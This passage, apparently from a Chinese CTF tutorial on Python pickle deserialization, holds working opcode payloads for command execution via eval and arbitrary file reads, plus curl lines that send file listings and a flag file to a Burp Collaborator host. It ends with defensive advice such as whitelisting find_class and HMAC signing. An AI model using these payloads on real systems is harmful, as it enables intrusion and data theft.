&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后手搓，在调用callable前添加MARK即&lt;code>(&lt;/code>，去掉&lt;code>t&lt;/code>和调用&lt;code>t&lt;/code>用到的MARK&lt;/p>
&lt;p>也就是&lt;code>[callable] [tuple] R===&amp;gt;MARK [callable] [args...] o&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>b'''cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS'get'\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS'__builtins__'\nop5\n0(g0\ng5\nS'eval'\nop6\n0(g6\nS'__import__(&amp;quot;os&amp;quot;).system(&amp;quot;whoami&amp;quot;)'\no.'''
&lt;/code>&lt;/pre>&lt;p>可以看下区别&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png" alt="image-20211024165337816">&lt;/p>
&lt;p>修改都是一对一对的，&lt;strong>总结一下方法就是&lt;code>0gx&lt;/code>要变为&lt;code>0(gx&lt;/code>，&lt;code>(gx&lt;/code>要变为&lt;code>gx&lt;/code> ，&lt;code>tR&lt;/code>换成&lt;code>o&lt;/code>&lt;/strong>&lt;/p>
&lt;p>参考：&lt;a href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--使用_getattributeload_objload_inst实现任意文件读取">&amp;ndash;&amp;raquo;使用&lt;code>_getattribute()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>实现任意文件读取&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>find_class()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># Subclasses may override this.&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">audit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.find_class&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fix_imports&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">[(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">__import__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">level&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>_getattribute()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;locals&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get local attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>
&lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">subpath&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">None&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parent&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>read()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>仍然以上面webtmp(究极缝合怪)的题为例，我们可以利用上面的函数，创建一个Animal的实例，然后将name或category的值设置为read wrapper的返回值&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;(&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;i__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;(X\x04\x00\x00\x00flagi__main__\nread\n.&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811193545692.png" alt="image-20210811193545692">&lt;/p>
&lt;p>再把这一部分的payload缝合到创建Animal实例的Opcode中去&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 原: name=&amp;#39;x&amp;#39;,category=&amp;#39;y&amp;#39;&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">xq&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># 缝合 应该能看出来改在哪里了&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">flagi__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811195932427.png" alt="image-20210811195932427">&lt;/p>
&lt;h2 id="一些小技巧注意事项">一些小技巧&amp;amp;注意事项&lt;/h2>
&lt;ul>
&lt;li>当把payload作为get参数请求时，url编码注意换行符是%0A而不是%0D%0A&lt;/li>
&lt;li>对payload进行b64加密时，注意别把\n给单独编码了（不过正常都不会）&lt;/li>
&lt;li>其他模块的load也可以触发pickle反序列化漏洞&lt;/li>
&lt;/ul>
&lt;p>例如：&lt;code>numpy.load()&lt;/code>先尝试以numpy自己的数据格式导入，如果失败，则尝试以pickle的格式导入；&lt;code>pandas.read_pickle()&lt;/code>直接使用&lt;code>pickle.load()&lt;/code>方法&lt;/p>
&lt;ul>
&lt;li>灵活运用&lt;u>&lt;strong>burp collaborator&lt;/strong>&lt;/u>&lt;/li>
&lt;/ul>
&lt;p>虽然我们不能把burp提供的collaborator当作vps来使用，进行反弹shell然后一通操作，但是我们可以利用反引号+curl的方式直接获得代码执行和结果的输出；curl本身的用法也很多，可以直接带文件进行post，更多内容参见：&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 基操1&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`)&lt;/span>
&lt;span style="color:#75715e"># 基操2 -d参数可以读取本地文件内容作为数据体发送，会自动添加请求头并调整请求方法 无需-X POST&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl -d &amp;#39;&lt;/span>&lt;span style="color:#f92672">@/&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39; http://xxxx.burpcollaborator.net/)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="最后出于安全角度的考量">最后，出于安全角度的考量&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>禁用pickle，使用Json或Google Protocol Buffers&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当确实需要使用pickle时，要确保对用户的输入进行过滤，比如重写&lt;code>find_class()&lt;/code>（使用白名单而不是黑名单进行过滤）、禁止某些操作符；由于在对opcode进行反序列化时可能会造成任意文件读写，一定提前对重要文件做好权限的管理；必要时可以对信息进行hmac签名&lt;/p>
&lt;/li>
&lt;li>
&lt;p>举一个hmac的栗子&lt;/p>
